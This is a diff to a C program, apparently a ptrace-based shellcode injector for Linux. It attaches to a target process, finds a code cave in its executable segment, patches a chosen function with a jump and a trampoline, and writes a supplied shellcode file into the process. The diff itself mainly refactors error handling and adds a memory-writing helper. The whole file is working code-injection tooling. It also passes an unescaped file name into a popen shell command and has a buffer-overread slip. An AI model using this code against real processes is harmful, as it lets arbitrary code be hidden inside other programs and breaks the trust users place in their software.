@@ -30,18 +30,36 @@
 #include <ctype.h>
 #include <stdarg.h>
 #include <limits.h>
+#include <errno.h>
 
 #include "CHelper/string_utils.h"
 #include "injector.h"
 
+static int attach_to_process(int pid);
+static int detach_from_process(int pid);
+
+static void *fmmap(void *addr, size_t *length, int prot, int flags, const char *pathname, off_t offset);
+static void write_to_process(int pid, addr64_t addr, uint8_t *bytes, size_t length);
+
+static void parse_proc_line(const char *line, struct mmap_region *buf);
+static void read_mem_regions(struct process_image *process);
+static struct process_image *create_proc_image(int pid);
+static void destroy_proc_image(struct process_image *image);
+
+static size_t pheader_size(addr32_t offset, const char *file);
+static void hexdump(uint8_t *bytes, size_t length, ...);
+
+static void fatal(int errnum, const char *s) __attribute__((noreturn));
+
 static int attach_to_process(int pid)
 {
+    errno = 0;
     int err = ptrace(PTRACE_ATTACH, pid, NULL, NULL);
 
     if (err >= 0)
         waitpid(pid, NULL, 0);
 
-    return err;
+    return errno;
 }
 
 static int detach_from_process(int pid)
@@ -62,14 +80,32 @@ static void *fmmap(void *addr, size_t *length, int prot, int flags,
 
     if (*length == 0) {
         if (fstat(fd, &st) == -1)
-            return NULL;
+            goto fstat_failed;
         *length = st.st_size;
     }
 
     mmap_addr = mmap(addr, *length, prot, flags, fd, offset);
+fstat_failed:
     close(fd);
-
     return mmap_addr;
+}
+
+static void write_to_process(int pid, addr64_t addr, uint8_t *bytes, size_t length)
+{
+    unsigned long *buffer = (unsigned long *)bytes;
+    size_t buf_length = 0;
+
+    if (length == 0)
+        return;
+
+    buf_length = (length / sizeof(buffer));
+    // write the remainder bytes
+    if (length % sizeof(buffer) != 0)
+        buf_length++;
+
+    for (size_t i = 0; i < buf_length; i++, addr+=sizeof(*buffer)) {
+        ptrace(PTRACE_POKETEXT, pid, addr, buffer[i]);
+    }
 }
 
 static void parse_proc_line(const char *line, struct mmap_region *buf)
@@ -175,7 +211,7 @@ static size_t pheader_size(addr32_t offset, const char *file)
     size_t line_len = 0;
 
     // FIXME: port this function to use only C code without popen()
-    c_sprintf_alloc(&command_str, "readelf -l %s | grep 0x%016lx -A1 | grep -v LOAD | awk '{print $1}'", file, offset);
+    c_sprintf_alloc(&command_str, "readelf -l %s | grep 0x%016lx -A1 | grep -v LOAD | awk '{print $1}'", file, (addr64_t)offset);
 
     pipe = popen(command_str, "r");
     getline(&line, &line_len, pipe);
@@ -217,21 +253,17 @@ int main(int argc, char *argv[])
     void *shellcode_mmaped = NULL;
     addr_rel32_t address_to_hook;
     int target_pid;
-    int shellcode_file_fd = 0;
     struct process_image *process = NULL;
     struct mmap_region *text_segment = NULL;
     addr_rel32_t padding_start;
-    addr_rel32_t hook_address;
 
     size_t shellcode_sz = 0;
     unsigned long original_bytes;
     unsigned char add_rsp_8[4] = "\x48\x83\xc4\x08";    // add  rsp, 0x8
     unsigned char jmpn_function[5] = "\xe9\xfc\xff\xff\xff";  //	jmp near function_address
-    int hook_address_jmpto;
-    int trampoline_jmp_address;
-    int err;
-
     unsigned char hook_asm[8] = "\xe9\x00\x00\x00\x00\x90\x90\x90";
+    unsigned char trampoline[17];
+    size_t trampoline_sz;
 
     if (argc < 4) {
         fprintf(stderr, "usage: ./injector shellcode address_to_hook target_pid\n");
@@ -243,25 +275,18 @@ int main(int argc, char *argv[])
     target_pid = atoi(argv[3]);
 
     printf("attaching to target %d\n", target_pid);
+    if (attach_to_process(target_pid) != 0)
+        fatal(errno, "failed to attach to proces");
 
-    err = attach_to_process(target_pid);
-    if (err != 0) {
-        printf("failed to attach to target (%s)\n", strerror(err));
-        exit(EXIT_FAILURE);
-    }
-
-    printf("preparing shellcode...\n");
+    printf("reading shellcode (%s)...\n", shellcode);
     shellcode_mmaped = fmmap(0, &shellcode_sz, PROT_READ | PROT_WRITE, MAP_PRIVATE, shellcode, 0);
-    if (!shellcode_mmaped) {
-        fprintf(stderr, "error mapping \"%s\"\n", shellcode);
-        exit(1);
-    }
+    if (!shellcode_mmaped)
+        fatal(errno, "error when reading shellcode");
+
     printf("gathering information about the process image\n");
     process = create_proc_image(target_pid);
-    if (!process) {
-        fprintf(stderr, "failed to open /proc/%d/maps :(\n", target_pid);
-        exit(1);
-    }
+    if (!process)
+        fatal(errno, "/proc/[pid]/maps not available");
 
     for (size_t i = 0; i < process->regions_num; i++) {
         if (process->regions[i].perms & PERM_EXEC) {
@@ -275,23 +300,17 @@ int main(int argc, char *argv[])
     printf("padding start at address 0x%x\n", padding_start);
 
     original_bytes = ptrace(PTRACE_PEEKTEXT, target_pid, address_to_hook, NULL);
-    printf("original bytes = 0x%lx\n", original_bytes);
+    printf("original bytes: ");
     hexdump(bytearray(original_bytes), sizeof(original_bytes));
 
-    hook_address = (padding_start+17) - (address_to_hook+5);
-    printf("padding_start+17 = 0x%x (%d)\n", padding_start, padding_start);
-    printf("address_to_hook+5 = 0x%x (%d)\n", address_to_hook, address_to_hook);
-    printf("hook_address = 0x%x (%d)\n", hook_address, hook_address);
+    patch_bytearray(hook_asm, 1, (padding_start+17) - (address_to_hook+5), addr_rel32_t);
+    patch_bytearray(hook_asm, 7, (original_bytes >> 7 * 8), unsigned char);
 
-    *(addr_rel32_t *)(hook_asm+1) = hook_address;
-    hook_asm[7] = (unsigned char)(original_bytes >> 7 * 8);
-
-    printf("writing hook to function...");
+    printf("writing hook to function: ");
     hexdump(hook_asm, sizeof(hook_asm));
-    ptrace(PTRACE_POKETEXT, target_pid, address_to_hook, *(unsigned long *)hook_asm);
+    write_to_process(target_pid, address_to_hook, hook_asm, sizeof(hook_asm));
 
-    trampoline_jmp_address = (address_to_hook+7) - (padding_start+17);
-    *(int *)(jmpn_function+1) = trampoline_jmp_address;
+    patch_bytearray(jmpn_function, 1, (address_to_hook +7) - (padding_start + 17), addr_rel32_t);
     printf("writing trampoline...\n");
 
     ptrace(PTRACE_POKETEXT, target_pid, padding_start, *(unsigned long *)add_rsp_8);
@@ -299,22 +318,26 @@ int main(int argc, char *argv[])
     ptrace(PTRACE_POKETEXT, target_pid, padding_start+4+sizeof(original_bytes), *(unsigned long *)jmpn_function);
 
     printf("writing shellcode...\n");
-    hook_address_jmpto = padding_start - (padding_start+4+sizeof(original_bytes)+5+shellcode_sz);
-
-    // FIXME: if shellcode is a empty file then it will segfault at injector.c::289
-    *(int*)(shellcode_mmaped+(shellcode_sz-4)) = hook_address_jmpto;
-    printf("here\n");
+    // FIXME: if shellcode is a empty file then it will segfault
+    patch_bytearray(shellcode_mmaped, shellcode_sz-4, padding_start - (padding_start+4+sizeof(original_bytes)+5+shellcode_sz), addr_rel32_t);
     hexdump(shellcode_mmaped, shellcode_sz);
 
-    for (size_t i = 0; i < shellcode_sz; i+=sizeof(unsigned long))
-        ptrace(PTRACE_POKETEXT, target_pid, padding_start+4+sizeof(original_bytes)+5+i, *(unsigned long *)(shellcode_mmaped+i));
+    write_to_process(target_pid, padding_start+4+sizeof(original_bytes)+5, shellcode_mmaped, shellcode_sz);
 
     destroy_proc_image(process);
-    close(shellcode_file_fd);
     munmap(shellcode_mmaped, shellcode_sz);
 
     printf("detaching from target\n");
     detach_from_process(target_pid);
-
     printf("** It worked!! :)\n...or maybe not ¯\\_(ツ)_/¯\n");
+}
+
+static void fatal(int errnum, const char *s)
+{
+    fputs(s, stderr);
+    if (errnum != 0)
+        fprintf(stderr, " (%s)", strerror(errnum));
+    printf("\n");
+
+    abort();
 }
